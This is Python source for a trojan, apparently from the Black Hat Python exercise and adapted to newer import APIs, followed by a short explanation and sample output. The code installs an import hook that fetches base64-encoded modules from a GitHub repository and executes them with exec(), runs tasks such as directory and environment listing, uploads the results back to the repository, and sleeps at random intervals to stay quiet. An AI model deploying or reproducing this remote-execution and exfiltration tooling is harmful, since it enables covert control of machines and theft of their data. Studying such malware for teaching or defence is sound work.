import base64
import github3
import importlib
import importlib.util
import json
import random
import sys
import threading
import time
from datetime import datetime


def github_connect():
    with open('mytoken.txt') as f:
        token = f.read().strip()
    sess = github3.login(token=token)
    me = sess.me()
    print(f"[*] Connected as: {me.login}")
    return sess.repository(me.login, 'bhptrojan')


def get_file_contents(dirname, module_name, repo):
    try:
        content = repo.file_contents(
            f'{dirname}/{module_name}'
        )
        return content.content
    except Exception as e:
        print(f"[-] Error getting {dirname}/{module_name}: {e}")
        return None


class GitImporter:
    def __init__(self):
        self.current_module_code = ""
        self.repo = github_connect()

    def find_spec(self, name, path, target=None):
        print(f"[*] GitImporter: looking for {name}")

        new_library = get_file_contents(
            'modules',
            f'{name}.py',
            self.repo
        )

        if new_library is not None:
            self.current_module_code = base64.b64decode(
                new_library
            )
            print(f"[+] GitImporter: found {name}")
            spec = importlib.util.spec_from_loader(
                name,
                loader=self
            )
            return spec

        return None

    def create_module(self, spec):
        return None

    def exec_module(self, module):
        exec(self.current_module_code, module.__dict__)
        print(f"[+] GitImporter: loaded {module.__name__}")


class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()

    def get_config(self):
        print(f"\n[*] Fetching config: {self.config_file}")

        config_json = get_file_contents(
            'config',
            self.config_file,
            self.repo
        )

        if config_json is None:
            print("[-] Could not get config")
            return []

        config = json.loads(base64.b64decode(config_json))
        print(f"[*] Config: {config}")

        for task in config:
            module_name = task['module']
            if module_name not in sys.modules:
                print(f"[*] Importing: {module_name}")
                try:
                    importlib.import_module(module_name)
                    print(f"[+] Imported: {module_name}")
                except Exception as e:
                    print(f"[-] Import failed {module_name}: {e}")

        return config

    def module_runner(self, module):
        print(f"[*] Running: {module}")
        try:
            result = sys.modules[module].run()
            print(f"[+] Result preview: {str(result)[:80]}")
            self.store_module_result(result)
        except Exception as e:
            print(f"[-] Runner error {module}: {e}")

    def store_module_result(self, data):
        message = datetime.now().isoformat()
        safe_message = message.replace(':', '-')
        remote_path = f'data/{self.id}/{safe_message}.data'
        bindata = bytes('%r' % data, 'utf-8')

        try:
            self.repo.create_file(
                remote_path,
                message,
                base64.b64encode(bindata)
            )
            print(f"[+] Stored: {remote_path}")
        except Exception as e:
            print(f"[-] Store error: {e}")

    def run(self):
        while True:
            config = self.get_config()

            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],)
                )
                thread.start()
                time.sleep(random.randint(1, 10))

            sleep_time = random.randint(30*60, 3*60*60)
            print(f"\n[*] Sleeping {sleep_time}s...")
            time.sleep(sleep_time)


if __name__ == '__main__':
    git_importer = GitImporter()
    sys.meta_path.append(git_importer)
    print(f"[+] GitImporter registered")

    trojan = Trojan('abc')
    trojan.run()

## Why This Happened

# | Old Way (Python 3.3 and below) | New Way (Python 3.4+) |
# |--------------------------------|----------------------|
# | `find_module()` | `find_spec()` |
# | `load_module()` | `create_module()` + `exec_module()` |
# | Book was written for older Python | Your Python is newer |

# ---

# ## Expected Output Now
# ```
# [*] Connected as: arsh-hash
# [+] GitImporter registered
# [*] Connected as: arsh-hash
# [*] Fetching config: abc.json
# [*] Config: [{'module': 'dirlister'}, {'module': 'environment'}]
# [*] Importing: dirlister
# [*] GitImporter: looking for dirlister
# [+] GitImporter: found dirlister
# [+] GitImporter: loaded dirlister
# [+] Imported: dirlister
# [*] Running: dirlister
# [*] In dirlister module
# [+] Result preview: ['.git', 'config', 'data'...]
# [+] Stored: data/abc/2024-xx-xx...data